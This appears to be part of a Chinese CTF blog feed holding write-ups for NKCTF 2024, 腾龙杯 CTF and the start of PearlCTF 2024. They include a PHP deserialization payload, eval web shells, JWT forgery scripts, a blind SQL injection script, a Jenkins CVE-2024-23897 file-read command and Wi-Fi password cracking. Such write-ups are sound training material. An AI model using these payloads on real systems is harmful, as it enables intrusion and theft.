+// TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoyOntzOjExOiJmaWxlSGFuZGxlcyI7YTowOnt9czo1OiJmaWxlcyI7YToxOntpOjA7TzoxNjoidGhpbmtcQ29sbGVjdGlvbiI6MTp7czo1OiJpdGVtcyI7TzoxMDoidGhpbmtcVmlldyI6Mjp7czo0OiJkYXRhIjthOjE6e3M6ODoiTG9naW5vdXQiO086MTE6InRoaW5rXERlYnVnIjowOnt9fXM6NjoiZW5naW5lIjthOjE6e3M6NDoidGltZSI7czo1OiIxMDA4NiI7fX19fX0=
+</code></pre>
+<p>使用guest登录<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711282961591-50fb0980-8adb-4569-9ea7-58ca8c59e7f9.png" alt="image.png" loading="lazy"></p>
+<p><code>Testone</code>写的文件名称为<code>md5(time())</code>，返回的<code>timeNow</code>记录了处理登录的时间戳。因为<code>time()</code>返回时间是秒级的，而这两个操作的时间间隔不到秒级，所以可以用登录的<code>timeNow</code>来计算文件名称。</p>
+<pre><code class="language-php">echo md5(&quot;1711282943&quot;);	// d1ff1f67b68695a5fb4521be6aa8cd3f
+</code></pre>
+<p>访问<code>/app/controller/user/think/1711283010d1ff1f67b68695a5fb4521be6aa8cd3f</code>拿到hint，内容大致如下：</p>
+<pre><code>......
+
+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;我曾听说，密码的明文，加上心爱之人的名字(Chu0)，就能够听到游客的心声。&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;
+
+......
+
+POST /?user/index/loginSubmit HTTP/1.1
+Host: 192.168.128.2
+Content-Length: 162
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://192.168.128.2
+Referer: http://192.168.128.2/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: kodUserLanguage=zh-CN; CSRF_TOKEN=xxx
+Connection: close
+
+name=guest&amp;password=tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI&amp;rememberPassword=0&amp;salt=1&amp;CSRF_TOKEN=xxx&amp;API_ROUTE=user%2Findex%2FloginSubmit
+
+hint: 新建文件
+</code></pre>
+<p>这里会发现前段提交的 password 会被 js 编码一次，而后端在校验前会对其进行解码<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711283456977-72862e10-ffbd-41f4-b75b-af3b2f0457c1.png" alt="image.png" loading="lazy"></p>
+<p>直接复制解码代码得到明文，同时根据提示得到密码：<code>!@!@!@!@NKCTFChu0</code>。登录guest账户，回收站中的<code>新建文件.html</code>应该就是前面hint所指的<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711283736123-b9c9e25d-6330-498c-a4b1-d2fceebe9d25.png" alt="image.png" loading="lazy"></p>
+<p>其中给出了shell文件<code>/data/files/shell</code></p>
+<pre><code class="language-html">/var/www/html/data/files/shell
+
+&lt;?php eval($_POST['0']); ?&gt;
+</code></pre>
+<p>虽然这里可以文件上传，但显然是传不了shell的（难不成让你挖0day？）。结合提示的内容往文件包含的思路想。全局搜索<code>include(</code>，不难找到在<code>app/controller/user/think/Config.php</code>存在反序列化利用点，和开始一样在一个<code>__call</code>中<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711284239327-814f7493-7160-4cbd-9d61-8f7c309e9222.png" alt="image.png" loading="lazy"></p>
+<p>修改之前POP链的部分</p>
+<pre><code class="language-php">namespace think;
+class View{
+    public function __construct()
+    {
+        $this-&gt;data = array(&quot;Loginout&quot; =&gt; new Config());
+        $this-&gt;engine = array(&quot;name&quot; =&gt;&quot;./../../../../../../var/www/html/data/files/shell&quot;);
+    }
+}
+
+namespace think;
+class Config{}
+</code></pre>
+<p>弹shell<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711285079747-69f6863c-86d6-41de-a173-d9a074b8852f.png" alt="image.png" loading="lazy"></p>
+<p>getflag<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711285117697-cbe41945-91ea-4980-a2a5-f241479f32e9.png" alt="image.png" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[腾龙杯CTF WP]]></title>
+        <id>https://skyblu3519.github.io/post/teng-long-bei-ctf-wp/</id>
+        <link href="https://skyblu3519.github.io/post/teng-long-bei-ctf-wp/">
+        </link>
+        <updated>2024-03-18T05:21:12.000Z</updated>
+        <content type="html"><![CDATA[<p>Team: Kill_me<br>
+Player: skkyblu3, fallingskies, xiaoxiao...</p>
+<h1 id="web">WEB</h1>
+<h2 id="这是一个登录页面">这是一个登录页面</h2>
+<p><code>/robots.txt</code>提示<code>/fulage</code></p>
+<p><code>/login</code>按提示传json返回jwt</p>
+<p>jwt伪造，加密方式设为none，用户设为admin。访问<code>/fulage</code> get flag<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710669022312-33167834-afc9-412e-aa2c-facf502e8647.png" alt="image.png" loading="lazy"></p>
+<h2 id="web2">web2</h2>
+<p>响应头返回服务器为gunicorn/20.0.4。</p>
+<p>Gunicorn请求走私：<a href="https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/">https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/</a></p>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710669269846-98c1e3c5-9540-462a-8be3-abb2fef189f1.png" alt="image.png" loading="lazy"></figure>
+<p>伪造UA头<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710577625600-12c5313d-c1fc-4ac5-8614-c2b8aa279c0a.png" alt="image.png" loading="lazy"></p>
+<p>提示<code>/fl4g</code>路由<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710577603068-c16441f9-624a-40cc-8333-a550a9e47b12.png" alt="image.png" loading="lazy"></p>
+<p>伪造XFF头<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710577562288-590de4c7-e2dd-434e-bfec-f5bd3847730b.png" alt="image.png" loading="lazy"></p>
+<h2 id="这又是一个登录页面">这又是一个登录页面</h2>
+<p>jwt使用RS256，<code>/robots.txt</code>给出了公钥。参考：<a href="https://wiki.wgpsec.org/knowledge/ctf/JWT.html">https://wiki.wgpsec.org/knowledge/ctf/JWT.html</a></p>
+<p>编写脚本</p>
+<pre><code class="language-python">import jwt
+
+PUBLIC_KEY = &quot;&quot;&quot;-----BEGIN PUBLIC KEY-----
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDLPaMvaLEtrAHieDdq1ufCHNj5
+aXw+K2x207zvi8T81QD9tkvUcIkiAzrb0yWbwsfkO+14m80NZHNjj2PyuDdp7rsa
+fEDqKrsSJJnx6DxybAiTqfKVqc2kgmPhJZq7JamarVokX8XQOppQPhRDE+utsXVo
+2SbZm7AglA6T4z6H9wIDAQAB
+-----END PUBLIC KEY-----&quot;&quot;&quot;
+
+
+print(jwt.encode({&quot;account&quot;: &quot;@dministr@t0r&quot;}, key=PUBLIC_KEY, algorithm='HS256'))
+</code></pre>
+<p>注释报错<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710669613322-c0dc28c5-7c39-4395-9388-c97c17e84c44.png" alt="image.png" loading="lazy"></p>
+<p>请求get flag<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710669634283-706550d4-dee0-4987-93de-1458a4eeb3cc.png" alt="image.png" loading="lazy"></p>
+<h2 id="html练习生">html练习生</h2>
+<p>进去之后随便注册一个账号登录。页面的功能有两个，<code>/change.php</code>可以修改<code>UserID</code>等信息，其中<code>UserID</code>不能为数字<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710670223422-ddfd662a-dacc-4b26-a053-c07d9be97f87.png" alt="image.png" loading="lazy"></p>
+<p><code>/log.php</code>查看登录日志<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710670262938-b6ddc1d8-aa7f-4c7e-b2dd-9dd1b8682e2d.png" alt="image.png" loading="lazy"></p>
+<p>可以感觉到<code>UserID</code>就是利用点。思考下php通常是怎么判断数字的<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710670412143-92fd09c0-4783-44a5-87d9-b028cf8d0da3.png" alt="image.png" loading="lazy"></p>
+<p><code>is_numeric</code>会将十六进制数返回true<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710670628531-8ee822c2-e1be-423a-a46d-34fd7b1ea2fa.png" alt="image.png" loading="lazy"></p>
+<p>而MySQL遇到<code>0x</code>开头的数字时，会将其自动转为字符串<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710670678607-dc797a81-6887-4fc8-8b0e-b05d52f000fc.png" alt="image.png" loading="lazy"></p>
+<p>在题目中尝试验证，用十六进制字符串修改<code>UserID</code><br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710670805602-5d95ed4f-30eb-474c-8e34-0f2f3e31fe3f.png" alt="image.png" loading="lazy"></p>
+<p>重新登录查看登录日志验证成功<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710670891554-460db492-9775-4191-9e5e-1b56f59bef08.png" alt="image.png" loading="lazy"></p>
+<p>使用<code>'</code>修改<code>UserID</code>，登录的时候提示<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710670951271-8c7623f5-ff2d-43c0-8f4f-e4506aa5afbd.png" alt="image.png" loading="lazy"></p>
+<p>由上可以推测这个大致的工作流程：</p>
+<ul>
+<li>用户信息在一个表中</li>
+<li><code>/change.php</code>可以用十六进制修改用户的<code>UserID</code></li>
+<li>登录的时候<code>UserID</code>会被插入到登录表中</li>
+<li>登录表的内容在<code>/log.php</code>中展示</li>
+</ul>
+<p>那么我们要做的就是在登录，系统用<code>UserID</code>更新登录表的时候，注入我们的SQL语句。因为页面没有详细的报错信息，所以这里用布尔盲注。注入的sql语句使用<code>1' and (布尔查询) and '1</code><br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710671549266-af3db84d-0b36-49a2-a8d9-976c488e05e0.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710671605572-b97744a1-ac1c-4c00-935a-de65579804fb.png" alt="image.png" loading="lazy"></p>
+<p>编写盲注脚本（二分查找）：</p>
+<pre><code class="language-python">import requests
+import time
+from bs4 import BeautifulSoup
+
+def login():
+    burp0_url = &quot;http://cbfoeshg.lab.aqlab.cn:80/login.php?status=success&quot;
+    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;pe3ummnn5lo8h04djclnv6ee36&quot;}
+    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Authorization&quot;: &quot;Basic emthcTp6a2Fx&quot;,
+                     &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://cbfoeshg.lab.aqlab.cn&quot;,
+                     &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,
+                     &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&quot;,
+                     &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,
+                     &quot;Referer&quot;: &quot;http://cbfoeshg.lab.aqlab.cn/login.php?status=success&quot;,
+                     &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;, &quot;Accept-Language&quot;: &quot;en,zh-CN;q=0.9,zh;q=0.8&quot;,
+                     &quot;Connection&quot;: &quot;close&quot;}
+    burp0_data = {&quot;username&quot;: &quot;Skkyblu3&quot;, &quot;password&quot;: &quot;Skkyblu3&quot;}
+    resp = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+    return resp.text
+
+def get_log():
+    burp0_url = &quot;http://cbfoeshg.lab.aqlab.cn:80/log.php&quot;
+    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;pe3ummnn5lo8h04djclnv6ee36&quot;}
+    burp0_headers = {&quot;Authorization&quot;: &quot;Basic emthcTp6a2Fx&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
+                     &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&quot;,
+                     &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,
+                     &quot;Referer&quot;: &quot;http://cbfoeshg.lab.aqlab.cn/index.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,
+                     &quot;Accept-Language&quot;: &quot;en,zh-CN;q=0.9,zh;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;}
+    resp = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
+
+    if resp.status_code != 200:
+        exit(-1)
+
+    return resp.text
+
+
+def extract_value(html_content):
+    soup = BeautifulSoup(html_content, 'lxml')
+    rows = soup.find_all('th')
+    last_row = rows[-3]
+
+    return last_row.text
+
+
+def string_to_hex(s):
+    hex_representation = '0x' + ''.join(format(ord(c), '02x') for c in s)
+    return hex_representation
+
+
+def modify(payload):
+    payload = string_to_hex(payload)
+
+    burp0_url = &quot;http://cbfoeshg.lab.aqlab.cn:80/change.php&quot;
+    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;pe3ummnn5lo8h04djclnv6ee36&quot;}
+    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Authorization&quot;: &quot;Basic emthcTp6a2Fx&quot;,
+                     &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Origin&quot;: &quot;http://cbfoeshg.lab.aqlab.cn&quot;,
+                     &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,
+                     &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&quot;,
+                     &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,
+                     &quot;Referer&quot;: &quot;http://cbfoeshg.lab.aqlab.cn/change.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,
+                     &quot;Accept-Language&quot;: &quot;en,zh-CN;q=0.9,zh;q=0.8&quot;, &quot;Connection&quot;: &quot;close&quot;}
+    burp0_data = {&quot;age&quot;: '', &quot;school&quot;: '', &quot;student_number&quot;: f&quot;{payload}&quot;}
+    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+
+
+def exploit(payload):
+    modify(payload)
+    login()
+    content = get_log()
+    res = extract_value(content)
+    return res
+
+
+result = &quot;&quot;
+for i in range(1, 1000):  # adjust as needed
+    param_data = {}
+    low = 32
+    high = 128
+    mid = (low + high) // 2
+    while low &lt; high:
+        # payload = f&quot;1' and (ASCII(substr((SELECT(group_concat(schema_name))FROM(information_schema.schemata)),{i},1))&gt;{mid}) and '1&quot;
+        # payload = f&quot;1' and (ASCII(substr((SELECT(group_concat(table_name))FROM(information_schema.tables)where(table_schema='test')),{i},1))&gt;{mid}) and '1&quot;
+        # payload = f&quot;1' and (ASCII(substr((SELECT(group_concat(column_name))FROM(information_schema.columns)where(table_name='injectflag')),{i},1))&gt;{mid}) and '1&quot;
+        payload = f&quot;1' and (ASCII(substr((SELECT(group_concat(fl4g))FROM(ctf.injectflag)),{i},1))&gt;{mid}) and '1&quot;
+        res = exploit(payload)
+
+        time.sleep(0.04)
+        if &quot;1&quot; == res:  # 在这个区域中
+            low = mid + 1
+        else:
+            high = mid
+        mid = (high + low) // 2
+
+    result += chr(mid)
+    print(&quot;Extracted so far: &quot; + result)
+    if mid == 32 or mid == 127:
+        break
+</code></pre>
+<p>get flag<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710671836783-49fdbd82-d5a0-4641-982f-cd8d8c70e08c.png" alt="image.png" loading="lazy"></p>
+<h1 id="awd">AWD</h1>
+<h2 id="签到jenkins是啥">签到：jenkins是啥？</h2>
+<p>Jenkins 未授权文件读取漏洞（CVE-2024-23897）<br>
+访问<a href="http://h9cvu77jr0.lab.aqlab.cn/">http://h9cvu77jr0.lab.aqlab.cn/jnlpJars/jenkins-cli.jar</a> 下载jar<br>
+java -jar jenkins-cli.jar -auth zkaq:zkaq -s &quot;<a href="http://h9cvu77jr0.lab.aqlab.cn%22">http://h9cvu77jr0.lab.aqlab.cn&quot;</a> -http who-am-i &quot;@/tmp/flag&quot;<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710685353661-6ec9edef-61c0-4c6a-9c14-8e7f58826605.png" alt="image.png" loading="lazy"></p>
+<h2 id="什么英文站">什么？英文站？</h2>
+<p>用html在github上搜搜，找到项目<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710580810233-cd334933-b3d9-49db-a554-a1c55273034e.png" alt="image.png" loading="lazy"></p>
+<p><code>/search.php</code>存在sql注入<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710672123797-db978957-172c-43d3-a592-72b6a70bcc6c.png" alt="image.png" loading="lazy"></p>
+<p>getflag<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710580824640-a8093566-3c39-4108-a064-f528e831e3ff.png" alt="image.png" loading="lazy"></p>
+<h2 id="来耍pyq">来耍pyq</h2>
+<p>发朋友圈可以上传图片，抓包发现图片使用base64上传的。推测后端的处理逻辑如下：</p>
+<pre><code class="language-php">$img = $_POST['imgbase64'];
+if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $img, $result)) {
+    $type = &quot;.&quot;.$result[2];
+    $path = &quot;upload/&quot; . date(&quot;Y-m-d&quot;) . &quot;-&quot; . uniqid() . $type;
+}
+$img =  base64_decode(str_replace($result[1], '', $img));
+@file_put_contents($path, $img);
+exit('{&quot;src&quot;:&quot;'.$path.'&quot;}');
+</code></pre>
+<p>用base64编码恶意代码上传</p>
+<pre><code>data:image/php;base64,PD9waHAgZXZhbCgkX0dFVFsic2treSJdKTs/Pg==
+</code></pre>
+<p>执行<code>phpinfo();</code>发现ban所有的命令执行函数。使用文件操作获取目录结构<code>?skky=echo implode(&quot;\n&quot;, array_diff(scandir('../'), array('.', '..')));</code><br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710651418783-ea06b3fa-56b1-4a62-b811-2678fc507b0b.png" alt="image.png" loading="lazy"></p>
+<p>getflag<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710672951977-c1979518-3386-4732-8433-cecc507cc934.png" alt="image.png" loading="lazy"></p>
+<h2 id="安全系统">安全系统</h2>
+<p>根据路由<code>patient/doctors.php</code>在github找到原项目：<a href="https://github.com/HashenUdara/edoc-doctor-appointment-system/tree/main">https://github.com/HashenUdara/edoc-doctor-appointment-system/tree/main</a><br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710683686735-c7249a7c-bcfd-4d22-a22a-911881818e8b.png" alt="image.png" loading="lazy"></p>
+<p>题目提示flag在一个patient的用户中。代码审计，在<code>patient/setting.php</code>存在用户遍历<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710683831323-ea341f25-0210-47a7-a6cc-0e86e5f09026.png" alt="image.png" loading="lazy"></p>
+<p>bp遍历用户，在id=234的时候出了结果，邮箱为patient@mypatient.com<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710683500970-ccf297d9-80ea-46a7-b927-2fb5bbd1668b.png" alt="image.png" loading="lazy"></p>
+<p>使用<code>patient/setting.php?action=edit&amp;id=234</code>直接修改用户密码。<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710686571088-20cce7bc-072b-4072-b4b7-d59200b6505f.png" alt="image.png" loading="lazy"></p>
+<p>登录用户get flag<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710686162625-dfa8752f-c0dd-45a2-b46d-fb01937ad5ae.png" alt="image.png" loading="lazy"></p>
+<h1 id="rev">REV</h1>
+<h2 id="签到输入神秘代码召唤神龙">签到：输入神秘代码，召唤神龙！</h2>
+<p>.net程序，直接使用dotpeek打开<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710685556810-fd61ee25-d42d-4119-abaf-59abb76345f1.png" alt="image.png" loading="lazy"><br>
+base64解密后比较字符<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710685606348-78f427f1-5cd9-43e2-b7fa-0d814bf8960b.png" alt="image.png" loading="lazy"></p>
+<h2 id="猜拳游戏">猜拳游戏</h2>
+<p>文件为apk，使用jadx打开<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710685795379-5af3d41c-1ebd-404b-8866-145702b7c949.png" alt="image.png" loading="lazy"><br>
+calc函数位于native层<br>
+将apk改为zip后解压<br>
+使用ida打开libcalc.so<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710685946769-bc8d6db8-7930-44a2-8ae1-f7a792d36e4f.png" alt="image.png" loading="lazy"><br>
+flag为<br>
+（1000+7）*107<br>
+apkflag{107749}</p>
+<h1 id="misc">MISC</h1>
+<h2 id="签到简简单单一张图片">签到：简简单单一张图片</h2>
+<p>查看图片，很多颜色块，应该是rgb隐写。<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710686160080-c793198e-9929-4422-a7cd-4ccdcaa41811.png" alt="image.png" loading="lazy"><br>
+使用stegsolver打开图片<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710686326979-9642e588-ee16-491e-a73f-4f7dc56912fb.png" alt="image.png" loading="lazy"><br>
+猜测使用了rot13<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710686422011-904c3c5e-f0fe-4c72-a302-a7dffbfac71a.png" alt="image.png" loading="lazy"></p>
+<h2 id="嘘~听是什么声音">嘘~听，是什么声音？</h2>
+<p>根据文件名字知道是DTMF隐写<br>
+使用在线网址分析<a href="http://dialabc.com/sound/detect/">http://dialabc.com/sound/detect/</a><br>
+解出后观察格式<br>
+81 63 31 21 93 42 21 71 71 93 74 81 82 31 93 31 81 61 33<br>
+第二位都是小于等于4，显然是9键密码<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710686673176-be5ebfb3-00ca-459e-be21-ba9d2970d6fc.png" alt="image.png" loading="lazy"><br>
+解得：TODAYHAPPYSTUDYDTMF</p>
+<h2 id="niu-niang分析">niu niang分析</h2>
+<p>使用wireshark打开发现是802.11格式<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710686774850-dc402e52-dc2a-45a6-8424-c17591eea7dd.png" alt="image.png" loading="lazy"><br>
+使用aircrack-ng先跑一下密码<br>
+<code>.\aircrack-ng.exe D:\Downloads\shujubao\shujubao.cap -w ..\..\..\..\rockyou.txt\rockyou.txt</code><br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710686979281-fed0f04c-8867-4a68-831f-b84a80779cc2.png" alt="image.png" loading="lazy"><br>
+得到密码是12345678<br>
+使用airdecap-ng解密数据包<br>
+<code>.\airdecap-ng.exe -e mamawoxiangwantiequan -p 12345678 D:\Downloads\shujubao\shujubao.cap</code><br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710687076789-927d394a-2760-41d3-8d3c-2d32dc0e3aaf.png" alt="image.png" loading="lazy"><br>
+打开wireshark分析<br>
+跟踪tcp流，找到第31个上传png，host是ip，很可疑<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710687187077-ee55feb1-9208-43eb-809a-c83b59468291.png" alt="image.png" loading="lazy"><br>
+将文件导到本地进行分析，用010editor打开，发现尾部有一个zip文件，分离出来，发现有密码。<br>
+根据session中得jwt提示<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710687299585-ebbae1f4-ae2d-4d93-8bb1-7033dda54912.png" alt="image.png" loading="lazy"><br>
+ping过得网站，查看没有icmp数据包，查看dns数据包<br>
+其中一个解析地址为127.0.0.1<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710687411378-c86e8eaa-9cd1-4a34-b005-0c8963d9e3c0.png" alt="image.png" loading="lazy"><br>
+使用密码解密zip，打开flag.txt<br>
+flag{f14376d0-793e-4e20-9eab-af23f3fdc158}</p>
+<h2 id="easy_forensics">easy_Forensics</h2>
+<p>使用Magnet AXIOM直接打开img<br>
+<a href="https://blog.51cto.com/u_15878568/5873703">Magnet AXIOM）</a><br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710688260155-9a23bdc9-da2b-46bd-ae07-3b8e61d9823e.png" alt="image.png" loading="lazy"><br>
+发现最近访问文件phos.png，导出文件<br>
+发现文件尾步中有一个zip 压缩包，提取 zip。<br>
+解压之得到message.img<br>
+挂载镜像，发现hint.txt<br>
+hint.txt的格式显然是坐标地址<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710688690358-d2609bd1-74b0-45f6-95fb-74d8214afb9f.png" alt="image.png" loading="lazy"><br>
+使用脚本画出二维码</p>
+<pre><code>import matplotlib.pyplot as plt
+with open('./hint.txt', 'r') as f:
+    save = f.readlines()
+x = []
+y = []
+for t in save:
+    x.append(t.split()[0])
+    y.append(t.split()[1])
+plt.axis('equal')
+plt.scatter(x, y, s = 1, c = 'black', marker = 's')
+plt.show()
+</code></pre>
+<p>使用画板的反色功能<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710688577598-959c2a6f-30a8-43dd-8b7a-de99081d186e.png" alt="image.png" loading="lazy"><br>
+扫描二维码，得到<br>
+Here is the vigenere key: aeolus, but i deleted the encrypted message。<br>
+使用010editor打开message.img，发现字符串：yispn!buwh_qcfd_ebo_mglzs<br>
+使用密码解密得：yeeeeet!just_find_and_solve<br>
+<img src="https://skyblu3519.github.io/post-images/tenglongCTF/1710689133759-8ef7a3c7-9ead-4b43-be2e-96a0f1fc9fed.png" alt="image.png" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[PearlCTF2024]WEB WP]]></title>
+        <id>https://skyblu3519.github.io/post/pearlctf2024web-wp/</id>
+        <link href="https://skyblu3519.github.io/post/pearlctf2024web-wp/">
+        </link>
+        <updated>2024-03-12T18:00:36.000Z</updated>
+        <content type="html"><![CDATA[<p>我是老馋</p>
+<h1 id="learn-http">learn HTTP</h1>
+<p>XSS三连击</p>
+<h2 id="题目描述">题目描述</h2>
+<p>题目给了源码，这个应用里面有两个服务分别是5000端口运行的nodejs，以及5001端口运行的golong，服务通过nginx代理出来。</p>
+<pre><code>server {
+    listen 6000;
+    listen [::]:6000;
+
+    server_name pearlctf.in;
+
+    location / {
+	    proxy_pass http://localhost:5000/;
+    }
+    
+    location /resp {
+    	proxy_pass http://localhost:5001/resp;
+    }
+}
+</code></pre>
+<p><code>/resp</code>路由接受一个body参数，它会将body作为整个响应内容（响应头+响应体）返回给客户</p>
+<pre><code class="language-go">func processClient(connection net.Conn) {
+	buffer := make([]byte, 1024)
+	mLen, err := connection.Read(buffer)
+	if err != nil {
+		fmt.Println(&quot;Error reading:&quot;, err.Error())
+	}
+	raw_http_req := strings.Split(string(buffer[:mLen]), &quot;\r\n&quot;)[0]
+	splitted_req := strings.Split(raw_http_req, &quot; &quot;)
+
+	if splitted_req[0] != &quot;GET&quot; {
+		_, err = connection.Write([]byte(&quot;HTTP/1.1 405 Method Not Allowed\r\n\r\nCan only GET&quot;))
+		connection.Close()
+		return
+	}
+
+	parsed, err := url.Parse(splitted_req[1])
+	if err != nil {
+		fmt.Println(&quot;Error parsing: &quot;, err.Error())
+	}
+
+	path := parsed.Path
+
+	if path != &quot;/resp&quot; {
+		_, err = connection.Write([]byte(&quot;HTTP/1.1 404 Not Found\r\n\r\nNot Found&quot;))
+		connection.Close()
+		return
+	}
+	
+	args, err := url.ParseQuery(parsed.RawQuery)
+
+	if err != nil {
+		_, err = connection.Write([]byte(&quot;HTTP/1.1 500 Internal Server Error\r\n\r\nError&quot;))
+		connection.Close()
+		return
+	}
+
+	body, ok := args[&quot;body&quot;]
+
+	if !ok {
+		_, err = connection.Write([]byte(&quot;HTTP/1.1 200 OK\r\n\r\nGive me some body&quot;))
+		connection.Close()
+		return
+	}
+
+	_, err = connection.Write([]byte(body[0]))
+	connection.Close()
+}
+</code></pre>
+<p>nodejs服务的<code>/check</code>同样接受一个body参数，它会对其值进行url编码，然后作为<code>/resp</code>的参数组装让bot.js访问</p>
+<pre><code class="language-javascript">const genToken = () =&gt; {
+    var token = jwt.sign({ id: 1 }, process.env.SECRET);
+    return token
+}
+
+app.post(&quot;/check&quot;, (req, res) =&gt; {
+    try {
+        let req_body = req.body.body
+        
+        if (req_body == undefined) {
+            return res.status(200).send(&quot;Body is not provided&quot;)
+        }
+
+        let to_req = `http://localhost:5001/resp?body=${encodeURIComponent(req_body)}`
+
